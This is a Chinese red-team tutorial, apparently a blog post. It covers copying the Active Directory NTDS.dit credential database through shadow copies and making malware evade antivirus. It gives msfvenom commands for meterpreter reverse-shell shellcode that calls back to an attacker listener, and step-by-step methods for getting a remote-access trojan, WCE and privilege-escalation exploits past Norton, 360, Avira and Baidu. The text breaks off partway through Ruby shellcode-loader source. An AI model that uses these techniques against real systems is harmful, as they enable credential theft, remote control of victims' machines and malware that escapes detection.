<p>在渗透中经常需要复制像NTDS.dit、mssql数据库文件等关键文件。由于这些文件都被占用,所以不能直接复制。下面介绍几个常用的命令or工具来实现复制</p>
<p><strong>VSSadmin</strong></p>
<p>域环境默认安装。</p>
<p><strong>使用：</strong></p>
<p>创建卷影</p>
<pre><code class="prism language-c">vssadmin create shadow <span class="token operator">/</span><span class="token keyword">for</span><span class="token operator">=</span>c<span class="token punctuation">:</span>
</code></pre>
<p>获取当前卷影</p>
<pre><code class="prism language-c">vssadmin list shadow 
</code></pre>
<p>从卷影复制文件</p>
<pre><code class="prism language-c">copy \\<span class="token operator">?</span>\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds<span class="token punctuation">.</span>dit c<span class="token punctuation">:</span>\ntds<span class="token punctuation">.</span>dit 
</code></pre>
<p>删除卷影</p>
<pre><code class="prism language-c">vssadmin delete shadows <span class="token operator">/</span><span class="token keyword">for</span><span class="token operator">=</span>c<span class="token punctuation">:</span> <span class="token operator">/</span>quiet
</code></pre>
<hr>
<p><strong>ntdsutil</strong></p>
<p>域环境默认安装</p>
<p>创建快照</p>
<pre><code class="prism language-c">ntdsutil snapshot <span class="token string">"activate instance ntds"</span> create quit quit 
</code></pre>
<p>挂载快照</p>
<pre><code class="prism language-c">ntdsutil snapshot "mount <span class="token punctuation">{</span><span class="token number">22508</span>acf<span class="token operator">-</span><span class="token number">8</span>a01<span class="token operator">-</span><span class="token number">4322</span><span class="token operator">-</span><span class="token number">867</span>d<span class="token operator">-</span><span class="token number">383</span>cf78f59e3<span class="token punctuation">}</span> quit quit
快照挂载为C<span class="token punctuation">:</span>\$SNAP_201912231558_V0LUMEC$\，copy ntds即可 
</code></pre>
<p>卸载快照</p>
<pre><code class="prism language-c">ntdsutil snapshot <span class="token string">"unmount {22508acf-8a01-4322-867d-383cf78f59e3}"</span> quit quit 
</code></pre>
<p>删除快照</p>
<pre><code class="prism language-c">ntdsutil snapshot <span class="token string">"delete {22508acf-8a01-4322-867d-383cf78f59e3}"</span> create quit quit
</code></pre>
<hr>
<p><strong>Vshadow</strong></p>
<p>不是系统默认工具，可在Microsoft SDK中获取</p>
<p>创建快照</p>
<pre><code class="prism language-c">vshadow<span class="token punctuation">.</span>exe <span class="token operator">-</span>p <span class="token operator">-</span>nw C<span class="token punctuation">:</span> 
</code></pre>
<p>获取快照列表</p>
<pre><code class="prism language-c">vshadow<span class="token punctuation">.</span>exe <span class="token operator">-</span>q
</code></pre>
<p>复制</p>
<pre><code class="prism language-c">copy Shadow copy device <span class="token string">"Name"</span>\windows\NTDS\ntds<span class="token punctuation">.</span>dit c<span class="token punctuation">:</span>\ntds<span class="token punctuation">.</span>dit 
</code></pre>
<p>删除快照</p>
<pre><code class="prism language-c">vshadow <span class="token operator">-</span>ds<span class="token operator">=</span><span class="token punctuation">{</span>ID<span class="token punctuation">}</span>
</code></pre>
<p><strong>Ninjacopy</strong></p>
<p>ninjacopy是powersploit中的一个powershell脚本直接使用 Invoke-NinjaCopy -Path &lt;需要复制的文件&gt; -LocalDestination &lt;复制文件保存位置&gt; 即可复制</p>
<p><strong>VolumeShadowCopyTools</strong></p>
<p>属于powersploit的项目，地址VolumeShadowCopyTools，之前遇到上面介绍的方法都不能复制数据库文件，使用这个工具成功复制</p>
<p>创建卷影</p>
<pre><code class="prism language-c">New<span class="token operator">-</span>VolumeShadowCopy <span class="token operator">-</span>Volume C<span class="token punctuation">:</span>\
</code></pre>
<p>列出卷影</p>
<pre><code class="prism language-c">Get<span class="token operator">-</span>VolumeShadowCopy
</code></pre>
<p>挂载卷影</p>
<pre><code class="prism language-c">Mount<span class="token operator">-</span>VolumeShadowCopy <span class="token operator">-</span>Path C<span class="token punctuation">:</span>\Users\public <span class="token operator">-</span>DevicePath \\<span class="token operator">?</span>
\GLOBALROOT\Device\HarddiskVolumeShadowCopy1   可直接在挂载点操作了 
</code></pre>
<p>卸载卷影</p>
<pre><code class="prism language-c">Remove<span class="token operator">-</span>VolumeShadowCopy <span class="token operator">-</span>DevicePath \\<span class="token operator">?</span>
\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
</code></pre>
<h1><a id="APT_6653"></a>九、红队自研-APT攻击方案模拟</h1>
<h2><a id="91__6654"></a>9.1 免杀方案研发</h2>
<h2><a id="911_Shellcode_6655"></a>9.1.1 实战免杀诺顿Shellcode载入内存免杀</h2>
<p><strong>Shellcode 载入内存免杀</strong></p>
<p>绕过诺顿主动、表面、通信拦截</p>
<p>创建MSF监听<br>
<img src="https://img-blog.csdnimg.cn/20201007232831146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>生成shellcode</p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp lhost<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.241</span><span class="token number">.132</span> lport<span class="token operator">=</span><span class="token number">8080</span> <span class="token operator">-</span>e x86<span class="token operator">/</span>shikata_ga_nai <span class="token operator">-</span>i <span class="token number">5</span> <span class="token operator">-</span>f raw <span class="token operator">&gt;</span> test<span class="token punctuation">.</span>c
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201007232847810.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c"><span class="token operator">-</span>p<span class="token punctuation">:</span> 指定payload；
<span class="token operator">-</span>e：指定编码方式；
<span class="token operator">-</span>i：编译次数；
<span class="token operator">-</span>b：去除指定代码，一般是空代码或者错误代码；
lhost：指定本机IP；
lport：指定本机监听端口；
<span class="token operator">-</span>f：指定生成格式；
<span class="token operator">-</span>o：指定生成输出后存储文件的位置
</code></pre>
<p>shellcode执行盒执行</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>clinicallyinane<span class="token operator">/</span>shellcode_launcher<span class="token operator">/</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201007232916559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
备注：窗口关闭后session掉线<br>
但是会通信会被拦截。</p>
<p><strong>诺顿查杀情况</strong><br>
表面过掉</p>
<p><img src="https://img-blog.csdnimg.cn/20201007233021906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
通信拦截<br>
<img src="https://img-blog.csdnimg.cn/20201007233033229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201007233038641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201007233050598.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201007233056914.png#pic_center" alt="在这里插入图片描述"><br>
<strong>绕过通信拦截</strong></p>
<p>建立https监听<br>
<img src="https://img-blog.csdnimg.cn/20201007233120951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>生成https shellcode</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_https lhost<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.241</span><span class="token number">.132</span> lport<span class="token operator">=</span><span class="token number">443</span> <span class="token operator">-</span>e x86<span class="token operator">/</span>shikata_ga_nai <span class="token operator">-</span>i <span class="token number">5</span> <span class="token operator">-</span>f raw <span class="token operator">&gt;</span> test2<span class="token punctuation">.</span>c
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201007233142527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>运行上线<img src="https://img-blog.csdnimg.cn/20201007233151535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="912__6713"></a>9.1.2 人人都能过杀软</h2>
<p><strong>适合人群：</strong></p>
<p>本人不懂c汇编等语言，但我一样能过杀毒（360/诺顿／avg／nod32等）</p>
<p>我也没人教就是看了网上教程会了一点点！如果各位大神你们看着不爽，那么请你忍忍不要喷！</p>
<p><strong>免杀方法：</strong></p>
<p>对于一个不懂汇编的人来说，我是怎么过杀软的呢？<br>
后面将会用360做为实例来给搭建演示。<br>
1、观察杀毒软件报的病毒名称，如果你修改后文件能正常使用并且杀软报毒名称变了，这样一般就可以过掉。</p>
<p>2、不管你怎么换资源或加壳杀软一只报同样的名字，那么就去定位一下特征码。</p>
<p>3、不同的杀毒软件免杀的方法略有不同。</p>
<p>例如：360报qvm7免杀方法是替换资源文件和版本信息。</p>
<p>4、本人常用的免杀方法：替换资源／加花／修改入口点／加壳等。</p>
<p><strong>0x00 免杀前的准备</strong></p>
<p>本次实例将会使用360杀毒来给大家演示。</p>
<p>病毒文件主要以提权EXP老给大家演示！</p>
<p>1、安装360杀毒软件，并把360杀毒的几个引擎全部安装上更新最新病毒库。</p>
<p>2、我在测试360杀毒的时候发现过几个问题：</p>
<pre><code class="prism language-c">a<span class="token punctuation">)</span> 不管你怎么杀<span class="token number">360</span>就是不报毒！那么请还原虚拟机！

b<span class="token punctuation">)</span><span class="token number">360</span>杀毒安装包。有老版本的尽量使用老版本的安装包。应为新版本的即使你关了上传还是会上传。

c<span class="token punctuation">)</span>本人使用的是<span class="token number">360</span>sd_std_4<span class="token punctuation">.</span><span class="token number">2.2</span><span class="token number">.4092</span>版本。在安装好后系统防火墙会提示是否开启安全卫士！具体名字记不清楚了，这个地方直接选择拦截就行了，没什么用。如果你选择的放行，那后面你做免杀的时候需要全部关掉<span class="token number">360</span>杀毒，选择拦截的话，只需要禁用<span class="token number">360</span>杀毒的实时防护功能。
</code></pre>
<p>3、360杀毒在全部安装完成和补丁升级成功之后需要关掉：可疑文件上传。<br>
<img src="https://img-blog.csdnimg.cn/20201007233614276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
4、在做免杀时请在断网环境下做！</p>
<p>5、360有5个引擎，再过的时候可以一个个去过。</p>
<p>6、需要用到工具包：小七免杀工具包（其实就用几个工具而已）<br>
<img src="https://img-blog.csdnimg.cn/20201007233639630.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>0X01 Ms15-051过360杀毒4引擎</strong></p>
<p>替换资源<br>
<img src="https://img-blog.csdnimg.cn/20201007233658684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
上图中是在联网环境下测试：可以看到360云报了！（小红伞本地也是报的！）</p>
<p>开始：</p>
<p>1、先断网</p>
<p>2、使用下图工具先替换下资源文件，看看360什么情况！<br>
<img src="https://img-blog.csdnimg.cn/2020100723371940.png#pic_center" alt="在这里插入图片描述"></p>
<p>3、下图可以看到360已经不杀了！小红伞本地也不杀了！</p>
<p>我只是添加了一个版本信息而已！<br>
<img src="https://img-blog.csdnimg.cn/20201007233735204.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
4、联网查杀也是不杀！我就不上图了！这就成功过掉了360杀毒的4个引擎！</p>
<p>修改字符串<img src="https://img-blog.csdnimg.cn/20201007233752132.png#pic_center" alt="在这里插入图片描述"><br>
仍c32里面！<br>
<img src="https://img-blog.csdnimg.cn/20201007233801114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
修改一下：<br>
<img src="https://img-blog.csdnimg.cn/20201007233810441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
我们杀一下看看！<br>
<img src="https://img-blog.csdnimg.cn/20201007233819416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
也成功过掉了！</p>
<p><strong>添加字符串</strong></p>
<p>仍c32 拖到最后，随便加点东西！<br>
<img src="https://img-blog.csdnimg.cn/20201007233845313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201007233853821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
来联网杀一下看看！</p>
<p><img src="https://img-blog.csdnimg.cn/20201007233904404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
过掉了！</p>
<p><strong>0x02  pr 过360杀毒4引擎</strong></p>
<p>修改区段</p>
<p>联网状态下杀一下看看什么情况！360云报！<br>
<img src="https://img-blog.csdnimg.cn/20201007233923494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
下面我就在联网情况下过！</p>
<p>使用的工具：<br>
<img src="https://img-blog.csdnimg.cn/20201007233936186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
修改区段名称：<br>
<img src="https://img-blog.csdnimg.cn/20201007233949112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201007233955126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201007234000647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>0x03 大灰狼远控过红伞</strong></p>
<p>朋友发我的时候是被小红伞干的！<br>
<img src="https://img-blog.csdnimg.cn/20201007234109146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
断网环境测试。这个病毒名字一般加一个加密壳就过掉了！我这里加个资源！<img src="https://img-blog.csdnimg.cn/20201007234118991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
红伞本地过掉！<br>
<img src="https://img-blog.csdnimg.cn/20201007234130106.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
qq管家过掉！</p>
<p><strong>0x04  WCE 过360杀毒4引擎</strong></p>
<p>联网查：</p>
<p>360云报！<br>
<img src="https://img-blog.csdnimg.cn/20201007234153950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
断网小红伞报！<br>
<img src="https://img-blog.csdnimg.cn/2020100723420215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
我们加花看下变不变！</p>
<p>联网查杀可以看到病毒名字变了！<br>
<img src="https://img-blog.csdnimg.cn/20201007234228563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
断网看红伞！已经过掉！<br>
<img src="https://img-blog.csdnimg.cn/20201007234238581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
现在本地都过了！就剩联网360云了！</p>
<p>拖c32里面去！拉到最后面！随便改！<br>
<img src="https://img-blog.csdnimg.cn/20201007234251213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/2020100723425835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
成功过掉360 杀毒4个引擎！</p>
<p><strong>0x05 大灰狼远控过瑞星</strong><br>
<img src="https://img-blog.csdnimg.cn/20201007234314627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
被干了！</p>
<p>加壳过掉！<br>
<img src="https://img-blog.csdnimg.cn/20201007234325386.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/2020100723433169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>0x06  getpassword过百度杀毒</strong></p>
<p>替换资源</p>
<p>百度杀毒默认安装：原始杀一下！<br>
<img src="https://img-blog.csdnimg.cn/20201007234351389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
加点东西！过了！<br>
<img src="https://img-blog.csdnimg.cn/20201007234400943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201007234406346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
开启监控！测试！无压力！<br>
<img src="https://img-blog.csdnimg.cn/20201007234419266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>垃圾字符串</strong></p>
<p>仍c32里面到最后面加点东西！</p>
<p><img src="https://img-blog.csdnimg.cn/202010072344342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201007234440249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>增加区段</strong></p>
<p>真是渣！增加一个区段！就过了！<br>
<img src="https://img-blog.csdnimg.cn/20201007234458399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201007234505214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>0x07 字体提权过百度杀毒（PE打乱）</strong></p>
<p>原始被杀<br>
<img src="https://img-blog.csdnimg.cn/20201007234520333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
打乱PE<br>
<img src="https://img-blog.csdnimg.cn/20201007234536265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>总结：</strong></p>
<p>要过杀毒就要想尽一切能修改程序还不叫他损坏的方法！</p>
<p>参考书籍：《精通黑客免杀》《黑客免杀攻防》</p>
<hr>
<h2><a id="913_360_6886"></a>9.1.3 远控木马极速免杀360五引擎</h2>
<p>属于内部资料，不分享出来了，下面推荐看的是免杀合集，非常不错！！！</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>freebuf<span class="token punctuation">.</span>com<span class="token operator">/</span>articles<span class="token operator">/</span>system<span class="token operator">/</span><span class="token number">227461.</span>html  <span class="token operator">--</span>免杀合集
</code></pre>
<hr>
<h2><a id="914_Ruby_shellcode_6892"></a>9.1.4 基于Ruby内存加载 shellcode第一季</h2>
<p>本季是为配合msf在渗透过程中无文件渗透，提前做基础过度。也为msf插件编写做基础过度</p>
<p>ruby shellcode 生成如下：</p>
<pre><code class="prism language-c">msfvenom ‐p windows<span class="token operator">/</span>messagebox TEXT<span class="token operator">=</span>Micropoor TITLE<span class="token operator">=</span>Micropoor ‐f ruby ‐‐smallest
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201007235503980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201007235512147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
附源码：</p>
<pre><code class="prism language-c">require <span class="token string">'fiddle'</span>
require <span class="token string">'fiddle/import'</span>
require <span class="token string">'fiddle/types'</span> 

<span class="token macro property"># msfvenom ‐p windows/messagebox TEXT=Micropoor TITLE=Micropoor ‐f ruby ‐‐smallest</span>
shellcode <span class="token operator">=</span>
 <span class="token string">"\\xd9\\xeb\\x9b\\xd9\\x74\\x24\\xf4\\x31\\xd2\\xb2\\x77\\x31\\xc9\\x64"</span> <span class="token operator">+</span>
 <span class="token string">"\\x8b\\x71\\x30\\x8b\\x76\\x0c\\x8b\\x76\\x1c\\x8b\\x46\\x08\\x8b\\x7e"</span> <span class="token operator">+</span>
<span class="token string">"\\x20\\x8b\\x36\\x38\\x4f\\x18\\x75\\xf3\\x59\\x01\\xd1\\xff\\xe1\\x60"</span> <span class="token operator">+</span>
<span class="token string">"\\x8b\\x6c\\x24\\x24\\x8b\\x45\\x3c\\x8b\\x54\\x28\\x78\\x01\\xea\\x8b"</span>
<span class="token string">"\\x4a\\x18\\x8b\\x5a\\x20\\x01\\xeb\\xe3\\x34\\x49\\x8b\\x34\\x8b\\x01"</span>
<span class="token string">"\\xee\\x31\\xff\\x31\\xc0\\xfc\\xac\\x84\\xc0\\x74\\x07\\xc1\\xcf\\x0d"</span>
<span class="token string">"\\x01\\xc7\\xeb\\xf4\\x3b\\x7c\\x24\\x28\\x75\\xe1\\x8b\\x5a\\x24\\x01"</span>
<span class="token string">"\\xeb\\x66\\x8b\\x0c\\x4b\\x8b\\x5a\\x1c\\x01\\xeb\\x8b\\x04\\x8b\\x01"</span>
<span class="token string">"\\xe8\\x89\\x44\\x24\\x1c\\x61\\xc3\\xb2\\x08\\x29\\xd4\\x89\\xe5\\x89"</span>
<span class="token string">"\\xc2\\x68\\x8e\\x4e\\x0e\\xec\\x52\\xe8\\x9f\\xff\\xff\\xff\\x89\\x45"</span>
<span class="token string">"\\x04\\xbb\\x7e\\xd8\\xe2\\x73\\x87\\x1c\\x24\\x52\\xe8\\x8e\\xff\\xff"</span>
<span class="token string">"\\xff\\x89\\x45\\x08\\x68\\x6c\\x6c\\x20\\x41\\x68\\x33\\x32\\x2e\\x64"</span>
<span class="token string">"\\x68\\x75\\x73\\x65\\x72\\x30\\xdb\\x88\\x5c\\x24\\x0a\\x89\\xe6\\x56"</span>
<span class="token string">"\\xff\\x55\\x04\\x89\\xc2\\x50\\xbb\\xa8\\xa2\\x4d\\xbc\\x87\\x1c\\x24"</span>
